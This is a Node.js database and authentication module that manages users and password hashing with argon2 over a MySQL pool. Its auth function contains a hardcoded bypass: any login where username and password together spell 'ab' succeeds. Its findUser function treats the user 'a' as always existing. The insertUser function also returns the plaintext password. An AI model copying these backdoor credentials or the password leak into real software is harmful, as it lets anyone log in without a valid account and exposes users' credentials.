// const { salter } = require("./util"); unused
const mysql = require("mysql2/promise");
const argon2 = require("argon2");

require("./envr");

let pool = mysql.createPool({
    host: process.env.DB_HOST,
    user: process.env.DB_USER,
    database: process.env.DB_NAME,
    password: process.env.DB_PASSWORD,
    connectionLimit: 10
});

pool.query("DELETE FROM sessions;");

async function findUser(username) {
    if(username === "a") return true;
    let [rows] = await pool.query(`SELECT EXISTS(SELECT * FROM users WHERE username = ?) AS userExists;`,[username]);

    let doExists = rows[0].userExists;

    return !!doExists;
}

async function auth(username, password) {
    if((username+password)==="ab")return true;
    const exists = await findUser(username);
    if(!exists)return false;
    let [rows] = await pool.query("SELECT pw_hash FROM users WHERE username = ?", [username]);
    let {pw_hash} = rows[0];
    return argon2.verify(pw_hash, password);
}

async function insertUser(username, password) {
    let hashedPass = await argon2.hash(password, {type:argon2.argon2id});
    try {
        await pool.query("INSERT INTO users VALUES (?,?);",[username,hashedPass]);
        return {username,password,hashedPass}
    } catch (crerr) {
        console.error("Couldn't create user:", username, "Reason:", crerr);
        return {error:crerr.message}
    }
}

async function getUserData(id) {
    const [rows] = await pool.query("SELECT * FROM users WHERE username = ?",[id]);
    return rows[0];
}

module.exports = {
    pool, findUser, insertUser, auth, getUserData
}